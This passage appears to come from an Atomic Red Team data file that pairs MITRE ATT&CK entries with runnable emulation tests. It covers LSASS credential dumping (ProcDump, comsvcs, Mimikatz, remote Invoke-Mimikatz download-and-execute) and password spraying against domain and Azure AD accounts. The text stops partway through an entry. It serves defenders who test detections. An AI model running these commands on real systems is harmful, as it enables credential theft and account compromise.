      - source_name: Symantec Attacks Against Government Sector
        description: Symantec. (2021, June 10). Attacks Against the Government Sector.
          Retrieved September 28, 2021.
        url: https://symantec.broadcom.com/hubfs/Attacks-Against-Government-Sector.pdf
      - source_name: TechNet Blogs Credential Protection
        description: Wilson, B. (2016, April 18). The Importance of KB2871997 and
          KB2928120 for Credential Protection. Retrieved April 11, 2018.
        url: https://blogs.technet.microsoft.com/askpfeplat/2016/04/18/the-importance-of-kb2871997-and-kb2928120-for-credential-protection/
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1003.001
    atomic_tests:
    - name: Dump LSASS.exe Memory using ProcDump
      auto_generated_guid: 0be2230c-9ab3-4ac2-8826-3199b9a0ebf8
      description: |
        The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
        ProcDump.

        Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.

        If you see a message saying "procdump.exe is not recognized as an internal or external command", try using the  get-prereq_commands to download and install the ProcDump tool first.
      supported_platforms:
      - windows
      input_arguments:
        output_file:
          description: Path where resulting dump should be placed
          type: path
          default: C:\Windows\Temp\lsass_dump.dmp
        procdump_exe:
          description: Path of Procdump executable
          type: path
          default: PathToAtomicsFolder\T1003.001\bin\procdump.exe
      dependency_executor_name: powershell
      dependencies:
      - description: 'ProcDump tool from Sysinternals must exist on disk at specified
          location (#{procdump_exe})

          '
        prereq_command: 'if (Test-Path #{procdump_exe}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "$env:TEMP\Procdump.zip"
          Expand-Archive $env:TEMP\Procdump.zip $env:TEMP\Procdump -Force
          New-Item -ItemType Directory (Split-Path #{procdump_exe}) -Force | Out-Null
          Copy-Item $env:TEMP\Procdump\Procdump.exe #{procdump_exe} -Force
      executor:
        command: "#{procdump_exe} -accepteula -ma lsass.exe #{output_file}\n"
        cleanup_command: 'del "#{output_file}" >nul 2> nul

          '
        name: command_prompt
        elevation_required: true
    - name: Dump LSASS.exe Memory using comsvcs.dll
      auto_generated_guid: 2536dee2-12fb-459a-8c37-971844fa73be
      description: |
        The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with a built-in dll.

        Upon successful execution, you should see the following file created $env:TEMP\lsass-comsvcs.dmp.
      supported_platforms:
      - windows
      executor:
        command: 'C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll,
          MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full

          '
        cleanup_command: 'Remove-Item $env:TEMP\lsass-comsvcs.dmp -ErrorAction Ignore

          '
        name: powershell
        elevation_required: true
    - name: Dump LSASS.exe Memory using direct system calls and API unhooking
      auto_generated_guid: 7ae7102c-a099-45c8-b985-4c7a2d05790d
      description: "The memory of lsass.exe is often dumped for offline credential
        theft attacks. This can be achieved using direct system calls and API unhooking
        in an effort to avoid detection. \nhttps://github.com/outflanknl/Dumpert\nhttps://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/\nUpon
        successful execution, you should see the following file created C:\\\\windows\\\\temp\\\\dumpert.dmp.\n\nIf
        you see a message saying \\\"The system cannot find the path specified.\\\",
        try using the  get-prereq_commands to download the  tool first.\n"
      supported_platforms:
      - windows
      input_arguments:
        dumpert_exe:
          description: Path of Dumpert executable
          type: path
          default: PathToAtomicsFolder\T1003.001\bin\Outflank-Dumpert.exe
      dependency_executor_name: powershell
      dependencies:
      - description: 'Dumpert executable must exist on disk at specified location
          (#{dumpert_exe})

          '
        prereq_command: 'if (Test-Path #{dumpert_exe}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          New-Item -ItemType Directory (Split-Path #{dumpert_exe}) -Force | Out-Null
          Invoke-WebRequest "https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe" -OutFile #{dumpert_exe}
      executor:
        command: "#{dumpert_exe}\n"
        cleanup_command: 'del C:\windows\temp\dumpert.dmp >nul 2> nul

          '
        name: command_prompt
        elevation_required: true
    - name: Dump LSASS.exe Memory using NanoDump
      auto_generated_guid: dddd4aca-bbed-46f0-984d-e4c5971c51ea
      description: |
        The NanoDump tool uses syscalls and an invalid dump signature to avoid detection.

        https://github.com/helpsystems/nanodump

        Upon successful execution, you should find the nanondump.dmp file in the temp directory
      supported_platforms:
      - windows
      dependency_executor_name: powershell
      dependencies:
      - description: 'NanoDump executable must exist on disk at specified location
          ($env:TEMP\nanodump.x64.exe)

          '
        prereq_command: 'if (Test-Path $env:TEMP\nanodump.x64.exe) {exit 0} else {exit
          1}

          '
        get_prereq_command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          Invoke-WebRequest "https://github.com/helpsystems/nanodump/raw/84db0c1737bbe027431733c193cfacf59a07259b/compiled/nanodump.x64.exe" -OutFile "$env:TEMP\nanodump.x64.exe"
      executor:
        command: '%temp%\nanodump.x64.exe -w "%temp%\nanodump.dmp"

          '
        cleanup_command: 'del "%temp%\nanodump.dmp" >nul 2> nul

          '
        name: command_prompt
        elevation_required: true
    - name: Dump LSASS.exe Memory using Windows Task Manager
      auto_generated_guid: dea6c349-f1c6-44f3-87a1-1ed33a59a607
      description: |
        The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with the Windows Task
        Manager and administrative permissions.
      supported_platforms:
      - windows
      executor:
        steps: |
          1. Open Task Manager:
            On a Windows system this can be accomplished by pressing CTRL-ALT-DEL and selecting Task Manager or by right-clicking
            on the task bar and selecting "Task Manager".

          2. Select lsass.exe:
            If lsass.exe is not visible, select "Show processes from all users". This will allow you to observe execution of lsass.exe
            and select it for manipulation.

          3. Dump lsass.exe memory:
            Right-click on lsass.exe in Task Manager. Select "Create Dump File". The following dialog will show you the path to the saved file.
        name: manual
    - name: Offline Credential Theft With Mimikatz
      auto_generated_guid: 453acf13-1dbd-47d7-b28a-172ce9228023
      description: |
        The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with
        Mimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.
      supported_platforms:
      - windows
      input_arguments:
        input_file:
          description: Path of the Lsass dump
          type: path
          default: "%tmp%\\lsass.DMP"
        mimikatz_exe:
          description: Path of the Mimikatz binary
          type: string
          default: PathToAtomicsFolder\T1003.001\bin\x64\mimikatz.exe
      dependency_executor_name: powershell
      dependencies:
      - description: 'Mimikatz must exist on disk at specified location (#{mimikatz_exe})

          '
        prereq_command: 'if (Test-Path #{mimikatz_exe}) {exit 0} else {exit 1}

          '
        get_prereq_command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX
          (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\"
          -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl
          = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url
          | where-object { $_.endswith(\".zip\") }\n$basePath = Split-Path #{mimikatz_exe}
          | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
      - description: 'Lsass dump must exist at specified location (#{input_file})

          '
        prereq_command: 'cmd /c "if not exist #{input_file} (exit /b 1)"

          '
        get_prereq_command: 'Write-Host "Create the lsass dump manually using the
          steps in the previous test (Dump LSASS.exe Memory using Windows Task Manager)"

          '
      executor:
        command: '#{mimikatz_exe} "sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords
          full" exit

          '
        name: command_prompt
        elevation_required: true
    - name: LSASS read with pypykatz
      auto_generated_guid: c37bc535-5c62-4195-9cc3-0517673171d8
      description: |
        Parses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::

        Python 3 must be installed, use the get_prereq_command's to meet the prerequisites for this test.

        Successful execution of this test will display multiple usernames and passwords/hashes to the screen.
      supported_platforms:
      - windows
      dependency_executor_name: command_prompt
      dependencies:
      - description: 'Computer must have python 3 installed

          '
        prereq_command: |
          py -3 --version >nul 2>&1
          exit /b %errorlevel%
        get_prereq_command: 'echo "Python 3 must be installed manually"

          '
      - description: 'Computer must have pip installed

          '
        prereq_command: |
          py -3 -m pip --version >nul 2>&1
          exit /b %errorlevel%
        get_prereq_command: 'echo "PIP must be installed manually"

          '
      - description: 'pypykatz must be installed and part of PATH

          '
        prereq_command: |
          pypykatz -h >nul 2>&1
          exit /b %errorlevel%
        get_prereq_command: 'pip install pypykatz

          '
      executor:
        command: 'pypykatz live lsa

          '
        name: command_prompt
        elevation_required: true
    - name: Dump LSASS.exe Memory using Out-Minidump.ps1
      auto_generated_guid: 6502c8f0-b775-4dbd-9193-1298f56b6781
      description: |
        The memory of lsass.exe is often dumped for offline credential theft attacks. This test leverages a pure
        powershell implementation that leverages the MiniDumpWriteDump Win32 API call.
        Upon successful execution, you should see the following file created $env:SYSTEMROOT\System32\lsass_*.dmp.

        Author of Out-Minidump: Matthew Graeber (@mattifestation)
      supported_platforms:
      - windows
      executor:
        command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (New-Object Net.WebClient).DownloadString('https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1'); get-process lsass | Out-Minidump
        cleanup_command: 'Remove-Item $env:TEMP\lsass_*.dmp -ErrorAction Ignore

          '
        name: powershell
        elevation_required: true
    - name: Create Mini Dump of LSASS.exe using ProcDump
      auto_generated_guid: 7cede33f-0acd-44ef-9774-15511300b24b
      description: |
        The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
        ProcDump. This particular method uses -mm to produce a mini dump of lsass.exe

        Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.

        If you see a message saying "procdump.exe is not recognized as an internal or external command", try using the  get-prereq_commands to download and install the ProcDump tool first.
      supported_platforms:
      - windows
      input_arguments:
        output_file:
          description: Path where resulting dump should be placed
          type: path
          default: C:\Windows\Temp\lsass_dump.dmp
        procdump_exe:
          description: Path of Procdump executable
          type: path
          default: PathToAtomicsFolder\T1003.001\bin\procdump.exe
      dependency_executor_name: powershell
      dependencies:
      - description: 'ProcDump tool from Sysinternals must exist on disk at specified
          location (#{procdump_exe})

          '
        prereq_command: 'if (Test-Path #{procdump_exe}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "$env:TEMP\Procdump.zip"
          Expand-Archive $env:TEMP\Procdump.zip $env:TEMP\Procdump -Force
          New-Item -ItemType Directory (Split-Path #{procdump_exe}) -Force | Out-Null
          Copy-Item $env:TEMP\Procdump\Procdump.exe #{procdump_exe} -Force
      executor:
        command: "#{procdump_exe} -accepteula -mm lsass.exe #{output_file}\n"
        cleanup_command: 'del "#{output_file}" >nul 2> nul

          '
        name: command_prompt
        elevation_required: true
    - name: Powershell Mimikatz
      auto_generated_guid: 66fb0bc1-3c3f-47e9-a298-550ecfefacbc
      description: "Dumps credentials from memory via Powershell by invoking a remote
        mimikatz script.\nIf Mimikatz runs successfully you will see several usernames
        and hashes output to the screen.\nCommon failures include seeing an \\\"access
        denied\\\" error which results when Anti-Virus blocks execution. \nOr, if
        you try to run the test without the required administrative privileges you
        will see this error near the bottom of the output to the screen \"ERROR kuhl_m_sekurlsa_acquireLSA\"\n"
      supported_platforms:
      - windows
      input_arguments:
        remote_script:
          description: URL to a remote Mimikatz script that dumps credentials
          type: url
          default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
      executor:
        command: 'IEX (New-Object Net.WebClient).DownloadString(''#{remote_script}'');
          Invoke-Mimikatz -DumpCreds

          '
        name: powershell
        elevation_required: true
    - name: Dump LSASS with createdump.exe from .Net v5
      auto_generated_guid: 9d0072c8-7cca-45c4-bd14-f852cfa35cf0
      description: |
        Use createdump executable from .NET to create an LSASS dump.

        [Reference](https://twitter.com/bopin2020/status/1366400799199272960?s=20)
      supported_platforms:
      - windows
      dependency_executor_name: powershell
      dependencies:
      - description: ".Net v5 must be installed\n"
        prereq_command: |
          $exePath =  resolve-path "$env:ProgramFiles\dotnet\shared\Microsoft.NETCore.App\5*\createdump.exe"
          if ($exePath -and (Test-Path $exePath)) {exit 0} else {exit 1}
        get_prereq_command: 'winget install Microsoft.DotNet.DesktopRuntime.5 --accept-source-agreements
          --accept-package-agreements --silent

          '
      executor:
        command: |
          $exePath =  resolve-path "$env:ProgramFiles\dotnet\shared\Microsoft.NETCore.App\5*\createdump.exe"
          & "$exePath" -u -f $env:Temp\dotnet-lsass.dmp (Get-Process lsass).id
        cleanup_command: 'Remove-Item $env:Temp\dotnet-lsass.dmp -ErrorAction Ignore

          '
        name: powershell
        elevation_required: true
    - name: Dump LSASS.exe using imported Microsoft DLLs
      auto_generated_guid: 86fc3f40-237f-4701-b155-81c01c48d697
      description: "The memory of lsass.exe is often dumped for offline credential
        theft attacks. This can be achieved by\nimporting built-in DLLs and calling
        exported functions. Xordump will re-read the resulting minidump \nfile and
        delete it immediately to avoid brittle EDR detections that signature lsass
        minidump files.\n\nUpon successful execution, you should see the following
        file created $env:TEMP\\lsass-xordump.t1003.001.dmp.\n"
      supported_platforms:
      - windows
      input_arguments:
        xordump_exe:
          description: Path to xordump
          type: path
          default: C:\Windows\Temp\xordump.exe
        output_file:
          description: Path where resulting dump should be placed
          type: path
          default: C:\Windows\Temp\lsass-xordump.t1003.001.dmp
      dependencies:
      - description: 'Computer must have xordump.exe

          '
        prereq_command: 'if (Test-Path ''#{xordump_exe}'') {exit 0} else {exit 1}

          '
        get_prereq_command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          Invoke-WebRequest "https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe" -OutFile #{xordump_exe}
      executor:
        command: "#{xordump_exe} -out #{output_file} -x 0x41\n"
        cleanup_command: 'Remove-Item #{output_file} -ErrorAction Ignore

          '
        name: powershell
        elevation_required: true
  T1179:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--66f73398-8394-4711-85e5-34c8540b22a5
      type: attack-pattern
      created: '2018-01-16T16:13:52.465Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - url: https://attack.mitre.org/techniques/T1179
        external_id: T1179
        source_name: mitre-attack
      - source_name: Microsoft Hook Overview
        description: Microsoft. (n.d.). Hooks Overview. Retrieved December 12, 2017.
        url: https://msdn.microsoft.com/library/windows/desktop/ms644959.aspx
      - url: https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process
        description: 'Hosseini, A. (2017, July 18). Ten Process Injection Techniques:
          A Technical Survey Of Common And Trending Process Injection Techniques.
          Retrieved December 7, 2017.'
        source_name: Elastic Process Injection July 2017
      - source_name: Adlice Software IAT Hooks Oct 2014
        description: 'Tigzy. (2014, October 15). Userland Rootkits: Part 1, IAT hooks.
          Retrieved December 12, 2017.'
        url: https://www.adlice.com/userland-rootkits-part-1-iat-hooks/
      - source_name: MWRInfoSecurity Dynamic Hooking 2015
        description: 'Hillman, M. (2015, August 8). Dynamic Hooking Techniques: User
          Mode. Retrieved December 20, 2017.'
        url: https://www.mwrinfosecurity.com/our-thinking/dynamic-hooking-techniques-user-mode/
      - source_name: HighTech Bridge Inline Hooking Sept 2011
        description: Mariani, B. (2011, September 6). Inline Hooking in Windows. Retrieved
          December 12, 2017.
        url: https://www.exploit-db.com/docs/17802.pdf
      - source_name: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017
        description: Microsoft. (2017, September 15). TrojanSpy:Win32/Ursnif.gen!I.
          Retrieved December 18, 2017.
        url: https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=TrojanSpy:Win32/Ursnif.gen!I&threatId=-2147336918
      - source_name: Symantec Windows Rootkits
        description: Symantec. (n.d.). Windows Rootkit Overview. Retrieved December
          21, 2017.
        url: https://www.symantec.com/avcenter/reference/windows.rootkit.overview.pdf
      - source_name: Volatility Detecting Hooks Sept 2012
        description: Volatility Labs. (2012, September 24). MoVP 3.1 Detecting Malware
          Hooks in the Windows GUI Subsystem. Retrieved December 12, 2017.
        url: https://volatility-labs.blogspot.com/2012/09/movp-31-detecting-malware-hooks-in.html
      - source_name: PreKageo Winhook Jul 2011
        description: Prekas, G. (2011, July 11). Winhook. Retrieved December 12, 2017.
        url: https://github.com/prekageo/winhook
      - source_name: Jay GetHooks Sept 2011
        description: Satiro, J. (2011, September 14). GetHooks. Retrieved December
          12, 2017.
        url: https://github.com/jay/gethooks
      - source_name: Zairon Hooking Dec 2006
        description: Felici, M. (2006, December 6). Any application-defined hook procedure
          on my machine?. Retrieved December 12, 2017.
        url: https://zairon.wordpress.com/2006/12/06/any-application-defined-hook-procedure-on-my-machine/
      - source_name: EyeofRa Detecting Hooking June 2017
        description: 'Eye of Ra. (2017, June 27). Windows Keylogger Part 2: Defense
          against user-land. Retrieved December 12, 2017.'
        url: https://eyeofrablog.wordpress.com/2017/06/27/windows-keylogger-part-2-defense-against-user-land/
      - source_name: GMER Rootkits
        description: GMER. (n.d.). GMER. Retrieved December 12, 2017.
        url: http://www.gmer.net/
      - source_name: Microsoft Process Snapshot
        description: Microsoft. (n.d.). Taking a Snapshot and Viewing Processes. Retrieved
          December 12, 2017.
        url: https://msdn.microsoft.com/library/windows/desktop/ms686701.aspx
      - source_name: StackExchange Hooks Jul 2012
        description: Stack Exchange - Security. (2012, July 31). What are the methods
          to find hooked functions and APIs?. Retrieved December 12, 2017.
        url: https://security.stackexchange.com/questions/17904/what-are-the-methods-to-find-hooked-functions-and-apis
      modified: '2020-11-10T18:29:30.516Z'
      name: Hooking
      description: "Windows processes often leverage application programming interface
        (API) functions to perform tasks that require reusable system resources. Windows
        API functions are typically stored in dynamic-link libraries (DLLs) as exported
        functions. \n\nHooking involves redirecting calls to these functions and can
        be implemented via:\n\n* **Hooks procedures**, which intercept and execute
        designated code in response to events such as messages, keystrokes, and mouse
        inputs. (Citation: Microsoft Hook Overview) (Citation: Elastic Process Injection
        July 2017)\n* **Import address table (IAT) hooking**, which use modifications
        to a process‚Äôs IAT, where pointers to imported API functions are stored. (Citation:
        Elastic Process Injection July 2017) (Citation: Adlice Software IAT Hooks
        Oct 2014) (Citation: MWRInfoSecurity Dynamic Hooking 2015)\n* **Inline hooking**,
        which overwrites the first bytes in an API function to redirect code flow.
        (Citation: Elastic Process Injection July 2017) (Citation: HighTech Bridge
        Inline Hooking Sept 2011) (Citation: MWRInfoSecurity Dynamic Hooking 2015)\n\nSimilar
        to [Process Injection](https://attack.mitre.org/techniques/T1055), adversaries
        may use hooking to load and execute malicious code within the context of another
        process, masking the execution while also allowing access to the process's
        memory and possibly elevated privileges. Installing hooking mechanisms may
        also provide Persistence via continuous invocation when the functions are
        called through normal use.\n\nMalicious hooking mechanisms may also capture
        API calls that include parameters that reveal user authentication credentials
        for Credential Access. (Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept
        2017)\n\nHooking is commonly utilized by [Rootkit](https://attack.mitre.org/techniques/T1014)s
        to conceal files, processes, Registry keys, and other objects in order to
        hide malware and associated behaviors. (Citation: Symantec Windows Rootkits)"
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: persistence
      - kill_chain_name: mitre-attack
        phase_name: privilege-escalation
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: |-
        Monitor for calls to the SetWindowsHookEx and SetWinEventHook functions, which install a hook procedure. (Citation: Microsoft Hook Overview) (Citation: Volatility Detecting Hooks Sept 2012) Also consider analyzing hook chains (which hold pointers to hook procedures for each type of hook) using tools  (Citation: Volatility Detecting Hooks Sept 2012) (Citation: PreKageo Winhook Jul 2011) (Citation: Jay GetHooks Sept 2011) or by programmatically examining internal kernel structures. (Citation: Zairon Hooking Dec 2006) (Citation: EyeofRa Detecting Hooking June 2017)

        Rootkits detectors  (Citation: GMER Rootkits) can also be used to monitor for various flavors of hooking activity.

        Verify integrity of live processes by comparing code in memory to that of corresponding static binaries, specifically checking for jumps and other instructions that redirect code flow. Also consider taking snapshots of newly started processes  (Citation: Microsoft Process Snapshot) to compare the in-memory IAT to the real addresses of the referenced functions. (Citation: StackExchange Hooks Jul 2012) (Citation: Adlice Software IAT Hooks Oct 2014)

        Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_permissions_required:
      - Administrator
      - SYSTEM
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1110.003:
    technique:
      modified: '2023-04-14T23:04:38.816Z'
      name: 'Brute Force: Password Spraying'
      description: |-
        Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)

        Typically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:

        * SSH (22/TCP)
        * Telnet (23/TCP)
        * FTP (21/TCP)
        * NetBIOS / SMB / Samba (139/TCP & 445/TCP)
        * LDAP (389/TCP)
        * Kerberos (88/TCP)
        * RDP / Terminal Services (3389/TCP)
        * HTTP/HTTP Management Services (80/TCP & 443/TCP)
        * MSSQL (1433/TCP)
        * Oracle (1521/TCP)
        * MySQL (3306/TCP)
        * VNC (5900/TCP)

        In addition to management services, adversaries may "target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols," as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)

        In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows "logon failure" event ID 4625.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_contributors:
      - Microsoft Threat Intelligence Center (MSTIC)
      - John Strand
      x_mitre_deprecated: false
      x_mitre_detection: |-
        Monitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). Specifically, monitor for many failed authentication attempts across various accounts that may result from password spraying attempts.

        Consider the following event IDs:(Citation: Trimarc Detecting Password Spraying)

        * Domain Controllers: "Audit Logon" (Success & Failure) for event ID 4625.
        * Domain Controllers: "Audit Kerberos Authentication Service" (Success & Failure) for event ID 4771.
        * All systems: "Audit Logon" (Success & Failure) for event ID 4648.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_platforms:
      - Windows
      - Azure AD
      - Office 365
      - SaaS
      - IaaS
      - Linux
      - macOS
      - Google Workspace
      - Containers
      x_mitre_version: '1.3'
      x_mitre_data_sources:
      - 'User Account: User Account Authentication'
      - 'Application Log: Application Log Content'
      type: attack-pattern
      id: attack-pattern--692074ae-bb62-4a5e-a735-02cb6bde458c
      created: '2020-02-11T18:39:25.122Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1110/003
        external_id: T1110.003
      - source_name: Trimarc Detecting Password Spraying
        description: 'Metcalf, S. (2018, May 6). Trimarc Research: Detecting Password
          Spraying with Security Event Auditing. Retrieved January 16, 2019.'
        url: https://www.trimarcsecurity.com/single-post/2018/05/06/Trimarc-Research-Detecting-Password-Spraying-with-Security-Event-Auditing
      - source_name: BlackHillsInfosec Password Spraying
        description: Thyer, J. (2015, October 30). Password Spraying & Other Fun with
          RPCCLIENT. Retrieved April 25, 2017.
        url: http://www.blackhillsinfosec.com/?p=4645
      - source_name: US-CERT TA18-068A 2018
        description: US-CERT. (2018, March 27). TA18-068A Brute Force Attacks Conducted
          by Cyber Actors. Retrieved October 2, 2019.
        url: https://www.us-cert.gov/ncas/alerts/TA18-086A
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1110.003
    atomic_tests:
    - name: Password Spray all Domain Users
      auto_generated_guid: 90bc2e54-6c84-47a5-9439-0a2a92b4b175
      description: |-
        CAUTION! Be very careful to not exceed the password lockout threshold for users in the domain by running this test too frequently.
        This atomic attempts to map the IPC$ share on one of the Domain Controllers using a password of Spring2020 for each user in the %temp%\users.txt list. Any successful authentications will be printed to the screen with a message like "[*] username:password", whereas a failed auth will simply print a period. Use the input arguments to specify your own password to use for the password spray.
        Use the get_prereq_command's to create a list of all domain users in the temp directory called users.txt.
        See the "Windows FOR Loop Password Spraying Made Easy" blog by @OrOneEqualsOne for more details on how these spray commands work. https://medium.com/walmartlabs/windows-for-loop-password-spraying-made-easy-c8cd4ebb86b5
      supported_platforms:
      - windows
      input_arguments:
        password:
          description: The password to try for each user in users.txt
          type: string
          default: Spring2020
      dependencies:
      - description: 'List of domain users to password spray must exits at %temp%\users.txt

          '
        prereq_command: 'if not exist %temp%\users.txt (exit /b 1)

          '
        get_prereq_command: 'PathToAtomicsFolder\T1110.003\src\parse_net_users.bat

          '
      executor:
        name: command_prompt
        elevation_required: false
        command: '@FOR /F %n in (%temp%\users.txt) do @echo | set/p=. & @net use %logonserver%\IPC$
          /user:"%userdomain%\%n" "#{password}" 1>NUL 2>&1 && @echo [*] %n:#{password}
          && @net use /delete %logonserver%\IPC$ > NUL

          '
    - name: Password Spray (DomainPasswordSpray)
      auto_generated_guid: 263ae743-515f-4786-ac7d-41ef3a0d4b2b
      description: |
        Perform a domain password spray using the DomainPasswordSpray tool. It will try a single password against all users in the domain

        https://github.com/dafthack/DomainPasswordSpray
      supported_platforms:
      - windows
      input_arguments:
        domain:
          description: Domain to brute force against
          type: string
          default: "$Env:USERDOMAIN"
      executor:
        name: powershell
        elevation_required: false
        command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain #{domain} -Force
    - name: Password spray all Active Directory domain users with a single password
        via LDAP against domain controller (NTLM or Kerberos)
      auto_generated_guid: f14d956a-5b6e-4a93-847f-0c415142f07d
      description: |
        Attempt to brute force all Active Directory domain users with a single password (called "password spraying") on a domain controller, via LDAP, with NTLM or Kerberos

        Prerequisite: AD RSAT PowerShell module is needed and it must run under a domain user (to fetch the list of all domain users)
      supported_platforms:
      - windows
      input_arguments:
        password:
          description: single password we will attempt to auth with (if you need several
            passwords, then it is a bruteforce so see T1110.001)
          type: string
          default: P@ssw0rd!
        domain:
          description: Domain FQDN
          type: string
          default: "$env:UserDnsDomain"
        auth:
          description: authentication method to choose between "NTLM" and "Kerberos"
          type: string
          default: NTLM
      executor:
        name: powershell
        elevation_required: false
        command: |
          if ("#{auth}".ToLower() -NotIn @("ntlm","kerberos")) {
            Write-Host "Only 'NTLM' and 'Kerberos' auth methods are supported"
            exit 1
          }

          $DomainUsers = Get-ADUser -LDAPFilter '(&(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server #{domain} | Select-Object -ExpandProperty SamAccountName

          [System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
          $di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier("#{domain}",389)

          $DomainUsers | Foreach-Object {
            $user = $_
            $password = '#{password}'

            $credz = new-object System.Net.NetworkCredential($user, $password, "#{domain}")
            $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})
            try {
              Write-Host " [-] Attempting ${password} on account ${user}."
              $conn.bind()
              # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
              Write-Host " [!] ${user}:${password} are valid credentials!"
            } catch {
              Write-Host $_.Exception.Message
            }
          }
          Write-Host "End of password spraying"
    - name: Password spray all Azure AD users with a single password
      auto_generated_guid: a8aa2d3e-1c52-4016-bc73-0f8854cfa80a
      description: |
        Attempt to brute force all Azure AD users with a single password (called "password spraying") via AzureAD Powershell module.
        Valid credentials are only needed to fetch the list of Azure AD users.
      supported_platforms:
      - azure-ad
      input_arguments:
        password:
          description: Single password we will attempt to auth with (if you need several
            passwords, then it is a bruteforce so see T1110.001)
          type: string
          default: P@ssw0rd!
        valid_username:
          description: Valid username to retrieve Azure AD users. We encourage users
            running this atomic to add a valid microsoft account domain; for eg <valid_test_user>@<valid_ms_account.com>
          type: string
          default: bruce.wayne@contoso.com
        valid_password:
          description: Valid password to authenticate as valid_username in the <valid_ms_account>
          type: string
